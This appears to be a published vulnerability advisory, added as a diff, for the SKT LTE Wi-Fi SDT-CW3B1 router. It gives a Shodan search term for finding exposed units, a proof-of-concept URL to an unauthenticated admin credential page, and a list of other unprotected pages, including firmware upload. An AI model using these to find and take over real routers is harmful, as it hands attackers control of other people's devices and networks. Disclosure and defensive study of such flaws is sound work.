@@ -1,0 +1,40 @@
+# Exploit Title: SKT LTE Wi-Fi SDT-CW3B1 - Unauthorized Admin Credential Change
+# Shodan Dork: SDT-CW3B1
+# Date: 2018-05-23
+# Exploit Author: Safak Aslan
+# Vendor Homepage: http://telesquare.co.kr/
+# Version:  SKT CW3B1 sw version 1.2.0
+# Tested on: Windows
+# CVE: -
+ 
+# Class: Unauthorized Admin Credential Change
+# Impact:  The attacker can access, change and remove admin's credential and sensitive data of the device.
+# Remotely Exploitable: Yes
+# Authentication Required: No
+ 
+# Vulnerability Description
+
+/admin/management.shtml    -->   System Management access without authentication
+
+# Using the directory of /admin/management.shtml, it is possible to access directly System Management without authentication. 
+# The attacker has a right to change User ID, 
+# Password for General User, User ID, and Password for Admin.
+
+# Proof-of-Concept
+
+http://targetIP/admin/management.shtml 
+
+
+# Additional Info
+
+Additionally, the attacker can reach without authorization the below directories.
+/admin/upload_firmware.shtml (Router firmware and lte firmware upgrade)
+/internet/wan.shtml (WAN settings info leak)
+/index.html (Version and status info leak) 
+/nas/ftpsrv.shtml (The settings of FTP)
+/wifi2g/basic.shtml (The settings of Wireless)
+/admin/status.shtml (The leak information of access point status)
+/internet/lan.shtml  (The leak information of LAN settings)
+/admin/statistic.shtml (System statistics info leak)
+/serial/serial_direct.shtml (The settings of direct serial)
+/admin/upload_firmware.shtml (Router Firmware and LTE Firmware upgrade)
